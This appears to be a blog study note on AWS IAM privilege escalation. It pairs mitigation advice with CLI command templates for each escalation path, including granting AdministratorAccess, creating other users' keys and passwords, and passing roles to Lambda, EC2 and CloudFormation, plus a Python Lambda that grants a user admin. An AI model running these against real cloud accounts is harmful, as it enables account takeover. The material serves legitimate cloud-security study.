---
title: AWS Deep Dive
date: 2022-09-27 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-09-27-aws-deep-dive.html
author: 100007
---

<h1 id="aws-deep-dive">AWS Deep Dive</h1>
<p><strong>author:</strong> Nathan Acks<br />
<strong>date:</strong> 2022-09-27</p>
<h1 id="aws-iam-privilege-escalation-methods-and-mitigation">AWS IAM Privilege Escalation: Methods and Mitigation</h1>
<p>Almost all of these issues boil down to “users with admin-like privileges can do admin-like things”.</p>
<p>The primary mitigation against these attacks is to aggressively restrict what resources permissions can be used on. This doesn’t <em>completely</em> mitigate the issue, since some of these resource/permission combinations may still be dangerous, but it’s really the only way to reduce the attack surface.</p>
<p>IAM policy variables can help here <em>a lot</em>. The aws:username and aws:SourceIp variables are particularly helpful restrictions (aws:username will often be redundant when everything is going <em>right</em>, but having that restriction in the policy will essentially prevent the policy reassignment attacks discussed below and allow dangerous permissions to be scoped so that users can only act on themselves).</p>
<ul>
<li><a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/">AWS IAM Privilege Escalation - Methods and Mitigation</a></li>
<li><a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_variables.html">IAM policy elements: Variables and tags</a></li>
</ul>
<h2 id="new-policy-versions">New Policy Versions</h2>
<p>Users with the iam:CreatePolicyVersion permission can not only create new versions of existing policies (with whatever permissions they desire), but also replace existing versions of that policy (but <em>only</em> if they do so on policy creation). Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam create-policy-version <span class="nt">--policy-arn</span> <span class="nv">$TARGET_POLICY_ARN</span> <span class="se">\</span>
<span class="nt">--policy-document</span> <span class="nv">$POLICY_JSON_FILE</span> <span class="nt">--set-as-default</span>
</code></pre></div></div>
<h2 id="change-the-default-version-of-an-existing-policy">Change the Default Version of an Existing Policy</h2>
<p>Users with the iam:SetDefaultPolicyVersion permission can roll back (or forward) policies to new versions. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam set-default-policy-version <span class="nt">--policy-arn</span> <span class="nv">$TARGET_POLICY_ARN</span> <span class="se">\</span>
<span class="nt">--version-id</span> <span class="nv">$POLICY_ID_TO_USE</span>
</code></pre></div></div>
<h2 id="create-an-ec2-instance-with-an-existing-profile">Create an EC2 Instance With an Existing Profile</h2>
<p>Users with both iam:PassRole and ec2:RunInstances can spin up a new EC2 instance they have access to using any existing instance profile. The user can then use the AWS keys associated with this instance to gain permission to perform any action the instance can. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws ec2 run-instances <span class="nt">--image-id</span> <span class="nv">$IMAGE_ID</span> <span class="se">\</span>
<span class="nt">--instance-type</span> <span class="nv">$INSTANCE_TYPE</span> <span class="se">\</span>
<span class="nt">--iam-instance-profile</span> <span class="nv">Name</span><span class="o">=</span><span class="nv">$TARGET_INSTANCE_PROFILE</span> <span class="se">\</span>
<span class="nt">--user-data</span> <span class="nv">$REVERSE_SHELL_SCRIPT</span>
</code></pre></div></div>
<p>Note that GuardDuty will trigger if EC2 instance keys are used outside of the instance itself.</p>
<h2 id="create-a-user-access-key">Create a User Access Key</h2>
<p>Users with the iam:CreateAccessKey permission can create (and then view) access keys. If this permission is applied to <em>other</em> users, then the malicious user can use this to effectively escalate their own privileges (by acting as another use with more extensive permissions). Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam create-access-key <span class="nt">--user-name</span> <span class="nv">$TARGET_USER</span>
</code></pre></div></div>
<p>Note that users can have at most two sets of access keys associated with them.</p>
<h2 id="create-new-login-profiles">Create New Login Profiles</h2>
<p>A user with the iam:CreateLoginProfile permission on <em>other</em> users can create a password for users that have not yet logged into the AWS Console, thus assuming their identity. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam create-login-profile <span class="nt">--user-name</span> <span class="nv">$TARGET_USER</span> <span class="se">\</span>
<span class="nt">--password</span> <span class="nv">$NEW_PASSWORD</span> <span class="nt">--no-password-reset-required</span>
</code></pre></div></div>
<p>This is a pretty targeted attack that requires a lot of special conditions, so I’m not sure how much of a risk it really is.</p>
<h2 id="update-an-existing-login-profile">Update an Existing Login Profile</h2>
<p>Same as the above, but allows a user with the iam:UpdateLoginProfile permission on <em>other</em> users to assume their identities <em>after</em> they’ve already logged in. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam update-login-profile <span class="nt">--user-name</span> <span class="nv">$TARGET_USER</span> <span class="se">\</span>
<span class="nt">--password</span> <span class="nv">$NEW_PASSWORD</span> <span class="nt">--no-password-reset-required</span>
</code></pre></div></div>
<p>This seems like a more realistic thing to worry about than the last vulnerability.</p>
<h2 id="attach-a-policy-to-a-user">Attach a Policy to a User</h2>
<p>The iam:AttachUserPolicy permission allows policies to be attached to <em>other</em> users. Including themselves. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam attach-user-policy <span class="nt">--user-name</span> <span class="nv">$TARGET_USER</span> <span class="se">\</span>
<span class="nt">--policy-arn</span> arn:aws:iam::aws:policy/AdministratorAccess
</code></pre></div></div>
<p>(Sure, an attacker could use any <code class="language-plaintext highlighter-rouge">$POLICY_ARN</code> here, but why not go for admin if you can get it? Which you can in this situation.)</p>
<h2 id="attach-a-policy-to-a-group">Attach a Policy to a Group</h2>
<p>The iam:AttachGroupPolicy permission allows for a similar scenario as the above, but for groups rather than users. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam attach-group-policy <span class="nt">--group-name</span> <span class="nv">$TARGET_GROUP</span> <span class="se">\</span>
<span class="nt">--policy-arn</span> arn:aws:iam::aws:policy/AdministratorAccess
</code></pre></div></div>
<h2 id="attach-a-policy-to-a-role">Attach a Policy to a Role</h2>
<p>The iam:AttachRolePolicy permission allows for a scenario like the last two, but for roles. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam attach-role-policy <span class="nt">--role-name</span> <span class="nv">$TARGET_ROLE</span> <span class="se">\</span>
<span class="nt">--policy-arn</span> arn:aws:iam::aws:policy/AdministratorAccess
</code></pre></div></div>
<p>Note that the attacker needs to control a user who has the sts:AssumeRole permission for that role in order to take advantage of this one.</p>
<h2 id="set-an-inline-policy-for-a-user">Set an Inline Policy for a User</h2>
<p>The iam:PutUserPolicy permission allows an attack like attaching a policy to a user, except that an inline policy is written to that user instead. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam put-user-policy <span class="nt">--user-name</span> <span class="nv">$TARGET_USER</span> <span class="se">\</span>
<span class="nt">--policy-name</span> <span class="nv">$POLICY_NAME</span> <span class="nt">--policy-document</span> <span class="nv">$POLICY_JSON_FILE</span>
</code></pre></div></div>
<h2 id="set-an-inline-policy-for-a-group">Set an Inline Policy for a Group</h2>
<p>You can guess what the iam:PutGroupPolicy lets you do by this point. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam put-group-policy <span class="nt">--group-name</span> <span class="nv">$TARGET_GROUP</span> <span class="se">\</span>
<span class="nt">--policy-name</span> <span class="nv">$POLICY_NAME</span> <span class="nt">--policy-document</span> <span class="nv">$POLICY_JSON_FILE</span>
</code></pre></div></div>
<h2 id="set-an-inline-policy-for-a-role">Set an Inline Policy for a Role</h2>
<p>Another obvious one. Requires the iam:PutRolePolicy permission. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam put-role-policy <span class="nt">--role-name</span> <span class="nv">$TARGET_ROLE</span> <span class="se">\</span>
<span class="nt">--policy-name</span> <span class="nv">$POLICY_NAME</span> <span class="nt">--policy-document</span> <span class="nv">$POLICY_JSON_FILE</span>
</code></pre></div></div>
<p>As with other role-based privilege escalation routes, also requires that the user have the sts:AssumeRole permission for <code class="language-plaintext highlighter-rouge">$TARGET_ROLE</code>.</p>
<h2 id="add-a-user-to-a-group">Add a User to a Group</h2>
<p>Add yourself to a privileged group with the iam:AddUserToGroup permission! Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam add-user-to-group <span class="nt">--group-name</span> <span class="nv">$TARGET_GROUP</span> <span class="se">\</span>
<span class="nt">--user-name</span> <span class="nv">$TARGET_USER</span>
</code></pre></div></div>
<h2 id="update-a-roles-assumerolepolicydocument">Update a Role’s AssumeRolePolicyDocument</h2>
<p>A user with <em>both</em> the iam:UpdateAssumeRolePolicy and the sts:AssumeRole permission can update the assumer role policy document for any role, allowing them to assume it. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws iam update-assume-role-policy <span class="nt">--role-name</span> <span class="nv">$TARGET_ROLE</span> <span class="se">\</span>
<span class="nt">--policy-document</span> <span class="nv">$ASSUME_ROLE_POLICY_JSON</span>
</code></pre></div></div>
<p>It seems like this trick really only works if the user’s sts:AssumeRole permission is already quite broad.</p>
<h2 id="pass-a-role-to-a-lambda-function">Pass a Role to a Lambda Function</h2>
<p>Okay, now things are getting interesting. The attackin user need the iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions. The idea is to pass a role (<em>any</em> role they want) to a Lambda new Lambda function that is configured to exploit the permissions of that role.</p>
<p>For example, the following Python code will promote the target user to full admin access, assuming that the Lambda function is passed a role that permits it to attach policies.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">boto3</span>
<span class="k">def</span> <span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
<span class="n">client</span> <span class="o">=</span> <span class="n">boto3</span><span class="p">.</span><span class="n">client</span><span class="p">(</span><span class="s">"iam"</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">attach_user_policy</span><span class="p">(</span>
<span class="n">UserName</span><span class="o">=</span><span class="s">"TARGET_USER"</span><span class="p">,</span>
<span class="n">PolicyArn</span><span class="o">=</span><span class="s">"arn:aws:iam::aws:policy/AdministratorAccess"</span>
<span class="p">)</span>
<span class="k">return</span> <span class="n">response</span>
</code></pre></div></div>
<p>This code can then be exploited using two AWS CLI commands:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create the Lambda function</span>
<span class="c">#</span>
aws lambda create-function <span class="nt">--function-name</span> <span class="nv">$FUNCTION_NAME</span> <span class="se">\</span>
<span class="nt">--runtime</span> python3.6 <span class="nt">--role</span> <span class="nv">$LAMBDA_ROLE_ARN_TO_PASS</span> <span class="se">\</span>
<span class="nt">--handler</span> <span class="nv">$FUNCTION_NAME</span>.lambda_handler <span class="nt">--code</span> <span class="nv">$PATH_TO_PYTHON_CODE</span>
<span class="c"># Invoke the Lambda function</span>
<span class="c">#</span>
aws lambda invoke <span class="nt">--function-name</span> <span class="nv">$FUNCTION_NAME</span> <span class="nv">$OUTPUT_FILE</span>
</code></pre></div></div>
<p>Basically, this is a way to exploit any role that can be passed to a Lambda function that has one of the other vulnerabilities in this list.</p>
<h2 id="pass-a-role-to-a-lambda-function-triggered-with-dynamodb">Pass a Role to a Lambda Function Triggered with DynamoDB</h2>
<p>Now we’re getting into Rube Goldberg territory. Requires the user to have the iam:PassRole, lambda:CreateFunction, and lambda:CreateEventSourceMapping permissions (but <em>not</em> lambda:InvokeFunction). The idea is the same as above, but rather than calling the function directly the function is attached to a suitable DynamoDB table event stream and triggered by a change in that table.</p>
<p>If no suitable DynamoDB table is available, then the dynamodb:CreateTable permission is required to make one. In this case the dynamodb:PutItem permission is probably also required to trigger the Lambda function (also useful for impatient attackers who are using existing but relatively inactive tables).</p>
<p>Attaching a Lambda function to a DynamoDB table’s event stream looks like the following:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws lambda create-event-source-mapping <span class="se">\</span>
<span class="nt">--function-name</span> <span class="nv">$FUNCTION_NAME</span> <span class="se">\</span>
<span class="nt">--event-source-arn</span> <span class="nv">$ARN_OF_DYNAMODB_TABLE_STREAM</span> <span class="se">\</span>
<span class="nt">--enabled</span> <span class="nt">--starting-position</span> LATEST
</code></pre></div></div>
<h2 id="update-an-existing-lambda-function">Update an Existing Lambda Function</h2>
<p>An attacker with the lambda:UpdateFunctionCode permission can update an existing Lambda function, effectively gaining the permissions of whatever IAM role is attached to it. Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws lambda update-function-code <span class="nt">--function-name</span> <span class="nv">$TARGET_FUNCTION</span> <span class="se">\</span>
<span class="nt">--zip-file</span> <span class="nv">$ZIP_FILE_WITH_LAMBDA_CODE</span>
</code></pre></div></div>
<p>(A zip file is used here on the assumption that an existing Lambda function is probably a lot more complex than the short code snippet presented previously. But that could also be used instead.)</p>
<h2 id="pass-a-role-to-glue-dev-endpoint">Pass a Role to Glue Dev Endpoint</h2>
<p>The combination of the iam:PassRole and glue:CreateDevEndpoint permissions creates a situation that is virtually identical to the EC2 instance attack described near the beginning. The only real difference is that an SSH key <em>must</em> be used here, but it can conveniently be specified at the command line (rather than having to be uploaded separately into AWS). Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws glue create-dev-endpoint <span class="nt">--endpoint-name</span> <span class="nv">$ENDPOINT_NAME</span> <span class="se">\</span>
<span class="nt">--role-arn</span> <span class="nv">$ROLE_ARN_TO_PASS</span> <span class="nt">--public-key</span> <span class="nv">$PATH_TO_SSH_PUBLIC_KEY</span>
</code></pre></div></div>
<h2 id="update-an-existing-glue-dev-endpoint">Update an Existing Glue Dev Endpoint</h2>
<p>This one just needs the glue:UpdateDevEndpoint permission. With this, an attacker can update the SSH key associated with an existing Glue endpoint, gaining access to the system (and hence its associated role). Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws glue <span class="nt">--endpoint-name</span> <span class="nv">$TARGET_ENDPOINT</span> <span class="se">\</span>
<span class="nt">--public-key</span> <span class="nv">$PATH_TO_SSH_PUBLIC_KEY</span>
</code></pre></div></div>
<h2 id="pass-a-role-to-cloudformation">Pass a Role to CloudFormation</h2>
<p>This one needs the combination of iam:PassRole and cloudformation:CreateStack. It’s basically like the EC2 and Glue attacks, except because CloudFormation is an automation service, there’s really no need for the attacker to log in - the template file can direct the created AWS resources to perform whatever actions the attacker wishes (and the passed in role allows). Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws cloudformation create-stack <span class="nt">--stack-name</span> <span class="nv">$STACK_NAME</span> <span class="se">\</span>
<span class="nt">--template-url</span> <span class="nv">$TEMPLATE_URL</span> <span class="nt">--role-arn</span> <span class="nv">$ROLE_ARN_TO_PASS</span>
</code></pre></div></div>
<p>Note that the <code class="language-plaintext highlighter-rouge">$TEMPLATE_URL</code> can be hosted <em>anywhere</em>.</p>
<h2 id="pass-a-role-to-data-pipeline">Pass a Role to Data Pipeline</h2>
<p>Data Pipeline is another automation service, and with the iam:passRole, datapipeline:CreatePipeline, and datapipeline:PutPipelineDefinition permissions it can be exploited in a similar fashion to CloudFormation. The main difference here is that the attacker will probably use the pipeline to execute AWS CLI commands, rather than orchestrating larger gobs of AWS resources (as with CloudFormation). Example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create an empty data pipeline</span>
<span class="c">#</span>
aws datapipeline create-pipeline <span class="nt">--name</span> <span class="nv">$PIPELINE_NAME</span> <span class="nt">--unique-id</span> <span class="nv">$UUID</span>
<span class="c"># Add a malicious action to the pipeline</span>
<span class="c">#</span>
aws datapipeline put-pipeline-definition <span class="nt">--pipeline-id</span> <span class="nv">$UUID</span> <span class="se">\</span>
<span class="nt">--pipeline-definition</span> <span class="nv">$PATH_TO_MALICIOUS_PIPELINE_DEFINITION_JSON</span>
</code></pre></div></div>